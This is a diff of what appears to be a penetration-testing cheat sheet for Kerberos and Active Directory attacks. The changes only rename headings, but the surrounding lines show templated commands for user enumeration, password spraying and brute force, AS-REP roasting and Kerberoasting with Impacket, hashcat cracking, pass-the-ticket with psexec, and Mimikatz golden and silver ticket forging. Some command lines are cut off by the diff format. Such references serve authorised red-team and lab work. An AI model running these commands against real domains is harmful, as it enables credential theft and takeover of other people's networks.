@@ -6,7 +6,7 @@
 
 ---
 
-## Nmap Kerberos User Enumeration
+## enum users nmap nse
 Use the krb5-enum-users NSE script to find valid usernames.
 
 ```bash
@@ -17,7 +17,7 @@ nmap -p {{PORT:port:88}} --script=krb5-enum-users --script-args krb5-enum-users.
 
 ---
 
-## Kerbrute User Enumeration
+## enum users kerbrute
 Validate usernames against a domain controller.
 
 ```bash
@@ -28,7 +28,7 @@ kerbrute userenum --dc {{DC_IP:ip}} -d {{DOMAIN:domain}} {{USERLIST:file:users.t
 
 ---
 
-## Kerbrute Password Spray
+## spray password kerbrute
 Spray a single password across many users.
 
 ```bash
@@ -39,7 +39,7 @@ kerbrute passwordspray --dc {{DC_IP:ip}} -d {{DOMAIN:domain}} {{USERLIST:file:us
 
 ---
 
-## Kerbrute Brute User
+## brute user password kerbrute
 Brute force passwords for a single user.
 
 ```bash
@@ -50,7 +50,7 @@ kerbrute bruteuser --dc {{DC_IP:ip}} -d {{DOMAIN:domain}} {{WORDLIST:wordlist:/u
 
 ---
 
-## AS-REP Roast (Impacket)
+## asreproast dump hashes impacket
 Pull AS-REP hashes for users without pre-auth.
 
 ```bash
@@ -61,7 +61,7 @@ impacket-GetNPUsers {{DOMAIN:domain}}/ -dc-ip {{DC_IP:ip}} -usersfile {{USERLIST
 
 ---
 
-## Crack AS-REP Hash
+## crack asrep hash hashcat
 Hashcat mode 18200 for Kerberos 5 AS-REP.
 
 ```bash
@@ -72,7 +72,7 @@ hashcat -m 18200 {{HASHFILE:file:asrep.hashes}} {{WORDLIST:wordlist:/usr/share/w
 
 ---
 
-## Kerberoast (Impacket)
+## kerberoast dump tgs impacket
 Request TGS hashes for SPN-bearing accounts.
 
 ```bash
@@ -83,7 +83,7 @@ impacket-GetUserSPNs {{DOMAIN:domain}}/{{USERNAME:str}}:'{{PASSWORD:str}}' -dc-i
 
 ---
 
-## Crack Kerberoast TGS
+## crack kerberoast tgs hashcat
 Hashcat mode 13100 for TGS-REP.
 
 ```bash
@@ -94,7 +94,7 @@ hashcat -m 13100 {{HASHFILE:file:kerberoast.hashes}} {{WORDLIST:wordlist:/usr/sh
 
 ---
 
-## Overpass-the-Hash (Get TGT from NT Hash)
+## overpass-the-hash get tgt
 Convert an NTLM hash into a TGT for further AD attacks.
 
 ```bash
@@ -105,7 +105,7 @@ impacket-getTGT {{DOMAIN:domain}}/{{USERNAME:str}} -hashes :{{NTHASH:str}} -dc-i
 
 ---
 
-## Pass-the-Ticket
+## pass-the-ticket psexec
 Use a stolen TGT for authentication.
 
 ```bash
@@ -116,7 +116,7 @@ KRB5CCNAME={{CCACHE:file:ticket.ccache}} impacket-psexec {{DOMAIN:domain}}/{{USE
 
 ---
 
-## Golden Ticket (Mimikatz)
+## forge golden ticket mimikatz
 Forge a TGT using the krbtgt NTLM hash.
 
 ```bash
@@ -127,7 +127,7 @@ mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /kr
 
 ---
 
-## Silver Ticket (Mimikatz)
+## forge silver ticket mimikatz
 Forge a TGS for a specific service account.
 
 ```bash
